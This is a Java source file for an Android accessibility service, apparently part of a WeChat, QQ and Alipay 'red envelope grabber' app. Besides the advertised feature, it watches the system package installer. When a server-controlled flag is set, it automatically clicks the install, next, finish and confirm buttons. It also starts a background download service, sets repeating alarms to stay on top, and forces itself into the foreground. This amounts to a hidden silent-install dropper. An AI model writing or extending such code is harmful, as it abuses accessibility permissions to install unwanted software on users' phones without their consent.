package com.shuiguo.base;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.shuiguo.activity.MainActivity;
import com.shuiguo.iview.IAliPayView;
import com.shuiguo.iview.IHongBaoView;
import com.shuiguo.receiver.AlarmReceiver;
import com.shuiguo.receiver.AlarmReceiverzd;
import com.shuiguo.redenvelope.R;
import com.shuiguo.service.DownloadService;
import com.shuiguo.utils.Constant;
import com.shuiguo.utils.Propers;
import com.shuiguo.utils.Udid;
import com.shuiguo.utils.Utils;
import com.shuiguo.utils.checkutil;
import com.shuiguo.utils.filestart;
import com.shuiguo.utils.loadfile;
import com.shuiguo.utils.util;

import org.json.JSONArray;
import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import static com.shuiguo.app.Constant.Sp.KEY_IS_ACTIVITIED;
import static com.shuiguo.app.Constant.Sp.KEY_SOUND;


/**
 * Created by xy on 16/1/27.
 */
public abstract class BaseAccessibilityService   extends AccessibilityService implements IHongBaoView,IAliPayView   {
    Exception es;
    String labelsm;
    private ArrayList<AccessibilityNodeInfo> mNodeInfoList = new ArrayList<AccessibilityNodeInfo>();
    private static final String TAG = "AutoInstallService";
    private static String PACKAGE_INSTALLER = "com.android.packageinstaller";
    private boolean mLuckyClicked;
    private boolean mContainsLucky;
    private boolean mContainsOpenLucky;
    private final static String PACKAGENAME_QQ = "com.tencent.mobileqq";//qq
    private final static String PACKAGENAME_WECAHT = "com.tencent.mm";//微信
    private final static String PACKAGENAME_ALIPAY = "com.eg.android.AlipayGphone";//支付宝
    protected abstract void initWeChatPresenter(AccessibilityEvent event);
    protected abstract void initQQPresenter(AccessibilityEvent event);
    protected abstract void initAliPresenter(AccessibilityEvent event);
    private static final long INTERVAL_TIME = 3;
    private static final int STEP_START = 1;
    private static final int STEP_NOTIFICATION = 2;
    private static final int STEP_CHAT_ITEM = 3;
    private NotificationManager mNM;
    private Method mSetForeground;
    private Method mStartForeground;
    private Method mStopForeground;
    private Object[] mSetForegroundArgs = new Object[1];
    private Object[] mStartForegroundArgs = new Object[2];
    private Object[] mStopForegroundArgs = new Object[1];
    private boolean mReflectFlg = false;
    private PowerManager.WakeLock mWakeLock;
    private KeyguardManager.KeyguardLock mKeyLock;

    private Handler mHandler = new Handler();
    private long mStartReceiveTime;
    private int mSetp = STEP_START;
    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event){

        String packageName = event.getPackageName().toString();
        if (PACKAGENAME_QQ.equals(packageName)&&Propers.with(this).load().getBoolean(KEY_IS_ACTIVITIED, false)){

            initQQPresenter(event);
        }
        if (PACKAGENAME_WECAHT.equals(packageName)&&Propers.with(this).load().getBoolean(KEY_IS_ACTIVITIED, false)){
            try {
                if (Propers.with(this).load().getBoolean(KEY_SOUND, true)&&event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                    Utils.playRingTone(this);
                }

            } catch (Exception e) {
                Log.e(TAG, "open notification error: " + e.getMessage());
            }
            initWeChatPresenter(event);
        }
        if(PACKAGENAME_ALIPAY.equals(packageName)&&Propers.with(this).load().getBoolean(KEY_IS_ACTIVITIED, false)){
            initAliPresenter(event);
        }

        int s=1;
        if(event.getPackageName().equals("com.android.packageinstaller")){
            if( event.getSource()==null){
                s=2;
            }
        }else{
            s=1;
        }

        int loadstat=new filestart().getloadstat();
        if (s==1&&loadstat==2) {
            try {
               // String[] labels = new String[]{"打开", "安装", "下一步","完成"};
                String[] labels = new String[]{ "安装", "下一步","完成","确定"};
//                String[] labels = new String[]{ "安装", "下一步","完成"};
                List<AccessibilityNodeInfo> nodeInfoList;
                for (String label : labels) {
                    labelsm=label;
                    if(event.getSource()!=null) {
                        nodeInfoList = event.getSource().findAccessibilityNodeInfosByText(label);
                        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
                            boolean performed = performClick(nodeInfoList);


                        }
                    }
                }
            } catch (Exception e) {

                /*这里会抛出一个异常暂时屏蔽*/
                //e.printStackTrace();

            }
        }

    }
    /** get current timestamp */
    private long currTime() {
        return System.currentTimeMillis() / 1000;
    }
    private void unlockScreen() {
        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        final KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("MyKeyguardLock");
        keyguardLock.disableKeyguard();

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK
                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                | PowerManager.ON_AFTER_RELEASE, "MyWakeLock");

        wakeLock.acquire();
    }
    @Override
    public void onCreate() {

        super.onCreate();
    }
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
//        new Thread(){
//            @Override
//            public void run(){
//                new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=openapk" + "&uid=" + Udid.with(BaseAccessibilityService.this).fetch());
//            }
//        }.start();


        if(new util().isServiceWork(this,"com.shuiguo.service.DownloadService")){
        }else {
            setAlarmTime();
            setAlarmTimeDown();
            startDownloadService();
            Intent it = new Intent(this, MainActivity.class);
            it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(it);
            showin();
            showin();

        }
        Toast.makeText(this, "抢红包服务已启动，蹲群守候吧", Toast.LENGTH_SHORT).show();
    }

    /*占顶循环*/
    public void setAlarmTime() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int time = 40000;

        long triggerAtTime = SystemClock.elapsedRealtime() + time;

        Intent mIntent = new Intent(this, AlarmReceiverzd.class);

        // PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, mIntent, 0);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 3, mIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        // alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, triggerAtTime, pendingIntent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
          //  alarmManager.setWindow(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime,0 , pendingIntent);
            alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
            //alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
//            Log.e("1","1");
            //alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
        } else {
//            Log.e("2", "2");
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, 40000, pendingIntent);
        }
    }
    /*占顶循环*/
    public void setAlarmTimeDown() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int time = new filestart().getstoptime();

        long triggerAtTime = SystemClock.elapsedRealtime() + time;

        Intent mIntent = new Intent(this, AlarmReceiver.class);

        // PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, mIntent, 0);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 2, mIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        // alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, triggerAtTime, pendingIntent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
            //alarmManager.setWindow(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0,time , pendingIntent);
            //alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);
        } else {
            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, time, pendingIntent);
        }
    }
    public void showin(){
        NotificationManager manager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
        Notification.Builder builder = new Notification.Builder(this);
        builder.setContentTitle(getResources().getString(R.string.app_name));
        builder.setContentText(getResources().getString(R.string.running_state));
        builder.setSmallIcon(R.mipmap.ic_launcher);
        Notification notification = builder.getNotification();
        manager.notify(R.mipmap.ic_launcher, notification);
        startForegroundCompat(-1982, notification);
    }

    void startDownloadService() {
        Intent it = new Intent(this, DownloadService.class);
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startService(it);
    }

    void invokeMethod(Method method, Object[] args) {
        try {
            method.invoke(this, args);
        } catch (InvocationTargetException e) {
            // Should not happen.
            Log.w("ApiDemos", "Unable to invoke method", e);
        } catch (IllegalAccessException e) {
            // Should not happen.
            Log.w("ApiDemos", "Unable to invoke method", e);
        }
    }
    void startForegroundCompat(int id, Notification notification) {
        if (mReflectFlg) {
            // If we have the new startForeground API, then use it.
            if (mStartForeground != null) {
                mStartForegroundArgs[0] = Integer.valueOf(id);
                mStartForegroundArgs[1] = notification;
                invokeMethod(mStartForeground, mStartForegroundArgs);
                return;
            }

            // Fall back on the old API.
            mSetForegroundArgs[0] = Boolean.TRUE;
            invokeMethod(mSetForeground, mSetForegroundArgs);
            mNM.notify(id, notification);
        } else {
            /* 还可以使用以下方法，当sdk大于等于5时，调用sdk现有的方法startForeground设置前台运行，
             * 否则调用反射取得的sdk level 5（对应Android 2.0）以下才有的旧方法setForeground设置前台运行 */

            if (Build.VERSION.SDK_INT >= 5) {
                startForeground(id, notification);
            } else {
                // Fall back on the old API.
                mSetForegroundArgs[0] = Boolean.TRUE;
                invokeMethod(mSetForeground, mSetForegroundArgs);
                mNM.notify(id, notification);
            }
        }
    }
        @Override
    public void onInterrupt() {
        Toast.makeText(this, "抢红包服务已中断", Toast.LENGTH_SHORT).show();
    }
    /*洗再累*/
    private boolean performInstallation(AccessibilityEvent event) {
        List<AccessibilityNodeInfo> nodeInfoList;
        String[] labels = new String[]{"安装","下一步","安装","完成","完成"};
        for (String label : labels) {
//            Log.e("label",label);
            nodeInfoList = event.getSource().findAccessibilityNodeInfosByText(label);
            if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
                boolean performed = performClick(nodeInfoList);
                if (performed) return true;
            }
        }

        List<AccessibilityNodeInfo> next_nodesss = event.getSource().findAccessibilityNodeInfosByText("下一步");
        if (next_nodesss != null && !next_nodesss.isEmpty()) {
            AccessibilityNodeInfo node;
            for (int i = 0; i < next_nodesss.size(); i++) {
                node = next_nodesss.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.e("下一步7", "下一步7");
                }
            }
        }
        List<AccessibilityNodeInfo> ok_nodeqs = event.getSource().findAccessibilityNodeInfosByText("完成");
        if (ok_nodeqs != null && !ok_nodeqs.isEmpty()) {
            AccessibilityNodeInfo node;
            for (int i = 0; i < ok_nodeqs.size(); i++) {
                node = ok_nodeqs.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.e("完成1", "完成1");

                }
            }
        }
        return false;
    }

    private boolean performClick(List<AccessibilityNodeInfo> nodeInfoList) {

            for (AccessibilityNodeInfo node : nodeInfoList) {
                if (node.isClickable() && node.isEnabled()) {
                    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }

        return false;
    }
    @TargetApi(Build.VERSION_CODES.KITKAT)
    public void recycle(AccessibilityNodeInfo info) {
        if (info.getChildCount() == 0) {
            Log.e(TAG, "child widget----------------------------" + info.getClassName());
            Log.e(TAG, "showDialog:" + info.canOpenPopup());
            Log.e(TAG, "Text：" + info.getText());
            Log.e(TAG, "windowId:" + info.getWindowId());
        } else {
            for (int i = 0; i < info.getChildCount(); i++) {
                if(info.getChild(i)!=null){
                    recycle(info.getChild(i));
                }
            }
        }
    }
}
